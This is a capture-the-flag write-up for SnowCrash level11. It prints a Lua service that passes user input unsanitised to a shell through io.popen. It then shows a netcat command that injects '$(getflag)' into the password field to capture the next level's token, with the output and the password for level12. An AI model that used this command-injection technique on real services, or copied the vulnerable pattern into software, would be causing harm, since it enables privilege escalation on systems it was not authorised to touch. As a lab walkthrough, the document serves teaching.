# Level11

```bash
level11@SnowCrash:~$ ls -lA
total 16
-r-x------ 1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------ 1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------ 1 level11 level11  675 Apr  3  2012 .profile
```

```lua
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

### Exploit

When reversing the hardcoded SHA1 hash in the source code, we get `NotSoEasy`... which is quite self-explanatory.

Instead we can do a basic shell exploitation using the string formating used for the `pass` variable, we'll print the content of `getflag` to a new file, writeable by the `flag11` user

```bash
level11@SnowCrash:~$ mktemp
/tmp/tmp.giOH6KoyPU

level11@SnowCrash:~$ chmod 777 /tmp/tmp.giOH6KoyPU

level11@SnowCrash:~$ nc -q3 127.0.0.1 5151 <<< 'test > /tmp/tmp.giOH6KoyPU' && cat /tmp/tmp.giOH6KoyPU
Password: Erf nope..
test

level11@SnowCrash:~$ nc -q3 127.0.0.1 5151 <<< '$(getflag) > /tmp/tmp.giOH6KoyPU' && cat /tmp/tmp.giOH6KoyPU
Password: Erf nope..
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

### Goto level12

```bash
level11@SnowCrash:~$ su level12
Password: <<< 'fa6v5ateaw21peobuub8ipe6s'
```
